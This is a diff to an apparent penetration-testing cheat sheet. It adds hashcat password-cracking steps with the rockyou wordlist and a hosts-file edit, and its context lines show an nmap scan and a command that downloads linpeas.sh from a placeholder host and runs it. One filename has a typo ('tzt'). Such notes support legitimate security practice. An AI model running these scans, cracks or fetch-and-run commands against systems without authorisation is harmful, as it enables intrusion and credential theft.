@@ -1,3 +1,8 @@
+## Edit host file:
+```bash
+sudo nano /etc/hosts
+```
+
 ## Network scan with`nmap`:
 ```bash
 nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt example.com
@@ -260,4 +265,18 @@ wget x.x.x.x:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh -a > ./output.txt
 less -r ./output.txt
+```
+
+## Crack hash with hashcat
+### Extract rockyou.txt (ParrotOS):
+```bash
+cd /usr/share/wordlists
+sudo gunzip rockyou.tzt.gz
+```
+### Crack hash:
+```bash
+mkdir hash
+cd hash
+nano hash.txt
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
